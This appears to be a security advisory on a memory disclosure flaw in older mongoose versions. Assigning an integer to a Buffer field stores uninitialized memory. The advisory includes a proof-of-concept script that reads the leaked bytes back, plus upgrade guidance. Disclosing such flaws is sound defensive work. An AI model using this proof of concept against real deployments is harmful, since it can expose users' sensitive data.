## Overview
A potential memory disclosure vulnerability exists in mongoose.
When documents with fields of type `Buffer` is created, assignment of an integer value to that field will result in creation of a buffer the length of which is the provided integer. This buffer will contain uninitialized memory, 
as a result a malicious user can create arbitrarily large buffers that are not zero-ed out, which can lead to saving sensitive information like code or user data in MongoDB.

### Details
With buffers in node when you allocate it with a number instead of a string it will allocate the amount of bytes.
**Example:**
```
var x = new Buffer(100);
// vs
var x = new Buffer('100');
```
This would allocate 100 bytes of memory in the first example and just 3 bytes with 100 as value in the second example. 

#### Proof of concept
```javascript
var mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/bufftest');

// data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html
mongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));

var Item = mongoose.model('Item');

var sample = new Item();
sample.id = 'item1';

// This will create an uninitialized buffer of size 100
sample.data = 100;
sample.save(function () {
    Item.findOne(function (err, result) {
        // Print out the data (exposed memory)
        console.log(result.data.toString('ascii'))
        mongoose.connection.db.dropDatabase(); // Clean up everything
        process.exit();
    });
});
```

## Remediation
Upgrade `mongoose` to version >= 3.8.39 or >= 4.3.6.

If a direct dependency update is not possible, use [`snyk wizard`](https://snyk.io/documentation/#wizard) to patch this vulnerability.

## References
- https://github.com/Automattic/mongoose/issues/3764
- https://github.com/ChALkeR/notes/blob/master/Lets-fix-Buffer-API.md#previous-materials
- https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md
